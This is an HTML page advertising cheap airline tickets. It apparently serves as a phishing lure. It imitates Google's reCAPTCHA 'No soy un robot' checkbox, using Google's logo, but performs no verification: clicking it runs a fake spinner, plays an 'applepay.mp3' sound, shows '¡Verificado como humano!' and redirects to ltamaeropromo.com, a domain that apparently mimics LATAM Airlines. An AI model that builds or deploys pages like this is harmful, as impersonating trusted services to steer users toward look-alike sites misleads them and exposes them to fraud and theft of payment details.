

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Tiquetes baratos</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f1f1f1;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .recaptcha-fake {
      width: 90%; max-width: 304px;
      height: 78px;
      background: #f9f9f9;
      border: 1px solid #d3d3d3;
      border-radius: 3px;
      display: flex;
      align-items: center;
      padding: 12px;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
      position: relative;
    }

    .checkbox-area {
      width: 28px;
      height: 28px;
      border: 1px solid #ccc;
      margin-right: 12px;
      position: relative;
      cursor: pointer;
    }

    .checkbox-area.checked::after {
      content: "✔";
      position: absolute;
      top: -3px;
      left: 4px;
      font-size: 24px;
      color: green;
    }

    .recaptcha-label {
      flex: 1;
    }

    .recaptcha-logo {
      font-size: 10px;
      text-align: center;
      margin-top: 4px;
      color: #555;
    }

    .loading-overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255,255,255,0.8);
      display: none;
      align-items: center;
      justify-content: center;
      border-radius: 3px;
    }

    .spinner {
      border: 4px solid #ccc;
      border-top: 4px solid #4285f4;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

  
    .thinking-dots {
      font-size: 32px;
      font-weight: bold;
      color: #4285f4;
      display: flex;
      gap: 4px;
      animation: blink 1s infinite;
    }

    
    .dot {
      font-size: 28px;
      font-weight: bold;
      color: #4285f4;
      opacity: 0;
      animation: blink-dots 1.5s infinite;
    }

    .dot1 { animation-delay: 0s; }
    .dot2 { animation-delay: 0.2s; }
    .dot3 { animation-delay: 0.4s; }

    @keyframes blink-dots {
      0% { opacity: 0; }
      20% { opacity: 1; }
      100% { opacity: 0; }
    }

    @keyframes blink {

      0% { opacity: 0.2; }
      50% { opacity: 1; }
      100% { opacity: 0.2; }
    }

    .verified-msg {
      margin-top: 20px;
      color: green;
      font-weight: bold;
      display: none;
      text-align: center;
      animation: slideIn 0.6s ease-out forwards;
    }

    
    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    
      from {
        opacity: 0;
        transform: translateY(-10px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    </style>
</head>
<body>
  <div>
    <div class="recaptcha-fake">
      <div class="checkbox-area" id="fake-checkbox" onclick="verificarFakeCaptcha(event)"></div>
      <div class="recaptcha-label">
        <div>No soy un robot</div>
        <div class="recaptcha-logo">
          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="20" alt="reCAPTCHA logo">
          reCAPTCHA<br>
          <span style="font-size: 8px;">Privacidad - Condiciones</span>
        </div>
      </div>
      <div class="loading-overlay" id="loading-overlay">
        
    <div class="thinking-dots">
      <span class="dot dot1">.</span>
      <span class="dot dot2">.</span>
      <span class="dot dot3">.</span>
    </div>
    
      </div>
    </div>
    <div class="verified-msg" id="verified-msg">¡Verificado como humano! ✅</div>
  </div>

  <!-- Audio beep -->
  <audio id="beep-audio" src="applepay.mp3" preload="auto"></audio>

  <script>
    function verificarFakeCaptcha(e) {
      const overlay = document.getElementById("loading-overlay");
      const checkbox = document.getElementById("fake-checkbox");
      const beep = document.getElementById("beep-audio");

      e.stopPropagation();

      if (checkbox.classList.contains("checked")) return;

      overlay.style.display = "flex";

      setTimeout(() => {
        overlay.style.display = "none";
        checkbox.classList.add("checked");

        // Reproducir beep
        beep.play();

        document.getElementById("verified-msg").style.display = "block";
        // Redirigir después del beep (0.5s después)
        setTimeout(() => {
          
        // Mostrar mensaje durante 2 segundos antes de redirigir
        setTimeout(() => {
          window.location.href = "https://ltamaeropromo.com/ES";
        }, 700);
    
        }, 500);
      }, 2000);
    }
  </script>
</body>
</html>
